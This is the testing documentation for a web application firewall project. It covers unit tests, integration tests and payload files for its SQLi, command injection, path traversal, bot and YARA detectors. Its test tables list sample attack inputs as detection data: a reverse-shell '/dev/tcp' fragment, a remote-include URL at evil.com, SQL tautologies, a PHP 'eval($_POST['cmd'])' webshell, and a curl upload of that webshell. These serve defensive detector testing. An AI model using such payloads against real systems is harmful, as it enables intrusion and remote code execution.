# Testing

## Overview

The project includes multiple test suites and payload files for
validating the WAF detection engines.

## C Engine Unit Tests

### Test Runner

File: tests/test_runner.c
Build: tests/Makefile

Compiles against kernel/ source files with BUILD_USERSPACE flag:

- http_inspect.c
- ip_blocklist.c
- tcp_monitor.c
- sqli_detect.c
- cmdi_detect.c
- path_detect.c
- bot_detect.c
- ip_reputation.c
- yara_engine.c
- ebpf_xdp.c

### Running

```bash
cd tests/
chmod +x run_tests.sh
./run_tests.sh
```

The run_tests.sh script:
1. Creates /etc/fw_inspect/yara directory
2. Runs make clean && make
3. Executes the test_runner binary
4. Runs make clean

### Test Suites

#### HTTP Inspector Tests (test_http_inspector)

| Test | Input | Expected |
|------|-------|----------|
| Benign GET | GET /index.html | No alert, result=0 |
| PHP Shell | POST with eval(data) | THREAT_PHP_SHELL alert |
| XSS script | ?q=<script>alert(1)</script> | THREAT_XSS alert |
| Near-match safe | systemmatic_evaluation | No alert (false positive check) |

#### Advanced Detection Tests (test_advanced_detectors)

| Test | Input | Expected |
|------|-------|----------|
| SQLi union select | "id=1+union+select+..." | score >= 40, detects UNION SELECT |
| SQLi tautology | "admin'+or+1=1--" | score >= 40, detects TAUTOLOGY |
| CMDi basic | ";whoami" | score >= 40, detects META_CHAR/SHELL_CMD |
| CMDi reverse shell | "bash -i >& /dev/tcp/..." | score >= 40, detects REV_SHELL/DEV_TCP |
| Path traversal | "../../../etc/passwd" | score >= 40, detects TRAVERSAL/LFI |
| RFI | "include=http://evil.com/shell.php" | score >= 40, detects RFI_HTTP |
| Bot UA | sqlmap User-Agent | score >= 40, detects SCANNER_UA |
| Honeypot path | GET /wp-login.php | score >= 40, detects HONEYPOT_PATH |
| IP reputation | Initial 100 -> -30 -> 70 -> -60 -> 10 -> +20 -> 30 | Score arithmetic and decay |

#### IP Blocklist Tests (test_ip_blocklist)

| Test | Input | Expected |
|------|-------|----------|
| Exact match | 192.168.1.50 (in list) | Blocked (1) |
| Neighbor allowed | 192.168.1.51 (not in list) | Allowed (0) |
| CIDR subnet | 10.250.4.5 (in 10.0.0.0/8) | Blocked (1) |
| Outside subnet | 11.0.0.1 (not in 10.0.0.0/8) | Allowed (0) |

#### TCP Monitor Tests (test_tcp_monitor)

| Test | Input | Expected |
|------|-------|----------|
| SYN flood | 101st SYN packet | Alert + DROP, THREAT_SYN_FLOOD |
| Slowloris timeout | 35s old incomplete HTTP conn | Alert + DROP, THREAT_SLOWLORIS |

#### Local IP Bypass Tests (test_local_ip_bypass)

| Test | Input | Expected |
|------|-------|----------|
| Local detection + bypass | 192.168.1.100, g_block_local_ips=0 | Alert logged, NF_ACCEPT |
| Local detection + block | 192.168.1.100, g_block_local_ips=1 | Alert logged, NF_DROP |

#### YARA File Upload Tests (test_file_upload_yara)

| Test | Input | Expected |
|------|-------|----------|
| Clean file | "clean_upload.txt" with benign text | No alert in log |
| Malicious file | "evil_upload.php" with eval() | YARA threat in log |

## PowerShell Integration Tests

File: test-payloads/run_tests.ps1

Tests the full WAF stack through Docker:
1. Clears database (DELETE events + ip_reputation)
2. For each node (localhost:80, localhost:81):
   - Sends SQLi payload
   - Sends CMDi payload
   - Sends path traversal payload
   - Uploads YARA webshell test file
3. Queries events table to verify detection

### Payload Files

| File | Content | Type |
|------|---------|------|
| sqli_payload.txt | UNION SELECT with admin bypass | SQL Injection |
| cmdi_payload.txt | cat /etc/passwd with pipe | Command Injection |
| path_traversal_payload.txt | ../../..//etc/passwd null byte | Path Traversal |
| yara_malice_payload.txt | PHP eval($_POST['cmd']) | PHP Webshell |

## Integration / REST API Tests

From testing.md:

```bash
# Fetch dashboard stats
curl "http://localhost:8443/api/v2/dashboard/stats?timeframe=24h&agent=all"

# Query events with filters
curl "http://localhost:8443/api/v2/events?search=192.168&severity=2&limit=50"

# Test email config
curl -X POST "http://localhost:8443/api/v2/config/test-email"

# Upload webshell for YARA detection (through Apache)
curl -F "file=@/tmp/evil_upload.php" http://localhost/upload.php
docker compose exec apache-server-1 cat /var/log/firewall/alerts.log
```

## Test Infrastructure

### Directory Structure

```
tests/
  Makefile          -- Build rules for test_runner
  run_tests.sh      -- Automated test execution script
  test_runner.c     -- C unit tests source
  testing.md        -- Integration test guide
  setup_bare_metal.md -- Bare metal deployment guide
  setup_docker.md   -- Docker deployment guide

test-payloads/
  sqli_payload.txt
  cmdi_payload.txt
  path_traversal_payload.txt
  yara_malice_payload.txt
  run_tests.ps1     -- PowerShell integration test script
```

### Expected Output

```
===========================================
NULLSPLOIT CORE LOGIC VALIDATION UNIT TESTS
===========================================
--- Running HTTP Inspector Tests ---
  Test 1 (Benign HTTP GET): Passed
  Test 2 (PHP Shell Injection): Passed
  Test 3 (XSS script Vector): Passed
  Test 4 (Near-match Safe String): Passed
--- Running SQLi, CMDi, Path/LFI/RFI, Bot, IP reputation Tests ---
  SQLi Detection Tests: Passed
  CMDi Detection Tests: Passed
  Path/LFI/RFI Detection Tests: Passed
  Bot/Scanner Detection Tests: Passed
  IP Reputation Tests: Passed
--- Running IP Blocklist Tests ---
  Test 1 (Exact Blocklist IP): Passed
  Test 2 (Neighbor Allowed IP): Passed
  Test 3 (Class A Subnet IP): Passed
  Test 4 (Outside Subnet IP): Passed
--- Running TCP Monitor Tests ---
  Test 1 (SYN Flood Interception): Passed
  Test 2 (Slowloris Timeout Interception): Passed
--- Running Local IP Bypass Tests ---
  Test (Local IP allowed but logged): Passed
  Test (Local IP blocked when option enabled): Passed
--- Running File Upload YARA Tests ---
  Test (File Upload YARA Scanner): Passed
===========================================
ALL TESTS PASSED SUCCESSFULLY!
===========================================
```
